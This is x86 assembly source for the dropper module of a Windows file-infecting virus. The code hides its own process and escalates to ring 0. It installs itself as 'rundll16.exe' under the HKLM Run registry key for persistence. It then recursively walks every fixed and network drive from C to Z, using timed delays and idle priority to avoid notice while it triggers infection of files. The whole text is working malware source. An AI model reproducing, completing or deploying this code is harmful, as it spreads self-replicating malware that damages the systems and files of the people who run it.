
; dropper code

root                    db      '?:\',0
allfiles                db      '*.*',0
dotdot                  db      '..',0

keyname1                db      'Software\Microsoft\Windows\CurrentVersion\Run',0
keyname2                db      'rundll16',0
dropper_name            db      '\'
keyvalue                db      'rundll16.exe',0
keyvalue_size           equ     $-keyvalue
dropper_name_size       equ     $-dropper_name

DELAY_ONSTART           equ     1000*10
DELAY_ONRECYCLE         equ     1000*60*10
DELAY_ONDIRECTORY       equ     1000*2
DELAY_ONFILE            equ     500

dropper_entry:

; hide process (thanx to S.S.R.)
                        call    GetCurrentProcessId
                        push    1
                        push    eax
                        call    RegisterServiceProcess

; go ring-0
                        call    pe_main

; set some registry keys

                        push    esp
                        push    esp
                        push    -1
                        push    0
                        push    offset keyname1
                        push    HKEY_LOCAL_MACHINE
                        call    RegOpenKeyExA
                        pop     esi

                        push    offset keyvalue_size
                        push    offset keyvalue
                        push    REG_SZ
                        push    0
                        push    offset keyname2
                        push    esi
                        call    RegSetValueExA

                        push    esi
                        call    RegCloseKey

; go idle
                        call    GetCurrentProcess
                        push    IDLE_PRIORITY_CLASS
                        push    eax
                        call    SetPriorityClass

; delay

                        push    DELAY_ONSTART
                        call    Sleep

; all dropper's action's will be repeated, program will not be terminated

dropper_cycle:

; scan all drives
                        mov     root, 'C'

__cycle:                push    offset root     ; get drive type
                        call    GetDriveTypeA

                        cmp     eax, DRIVE_FIXED
                        je      __ok
                        cmp     eax, DRIVE_REMOTE
                        jne     __cycle_next

__ok:                   lea     edi, root       ; recursivly process drive
                        call    infectdir

__cycle_next:           inc     root

                        cmp     root, 'Z'
                        jbe     __cycle

                        ;;

                        push    DELAY_ONRECYCLE
                        call    Sleep

                        jmp     dropper_cycle

; input:  EDI=directory
; action: process directory & all subdirectories

infectdir:              pusha

; pause
                        push    DELAY_ONDIRECTORY
                        call    Sleep

; set current directory
                        push    edi
                        call    SetCurrentDirectoryA

                        push    offset ff
                        push    offset allfiles
                        call    FindFirstFileA          ; find first

; keep handle
                        xchg    esi, eax                ; ESI <-- FindHandle

__cycle:

; check file extension
                        lea     edi, ff.w32fd_fullname
                        call    getext
                        jne     __fileok

; get file attrib -- file will be infected in ring0
                        push    offset ff.w32fd_fullname ; infect in ring-0
                        call    GetFileAttributesA

; pause
                        push    DELAY_ONFILE
                        call    Sleep

__fileok:
                        test    ff.w32fd_attr, 16       ; directory?
                        jz      __next

                        lea     edi, ff.w32fd_fullname  ; ./.. ?
                        cmp     byte ptr [edi], '.'
                        je      __next

                        call    infectdir       ; recurse

__next:                 push    offset ff       ; ; find next
                        push    esi
                        call    FindNextFileA

                        or      eax, eax
                        jnz     __cycle

; find close
                        push    esi
                        call    FindClose

; set directory to previous (we know it is 1 level up)

                        push    offset dotdot
                        call    SetCurrentDirectoryA

                        popa
                        ret

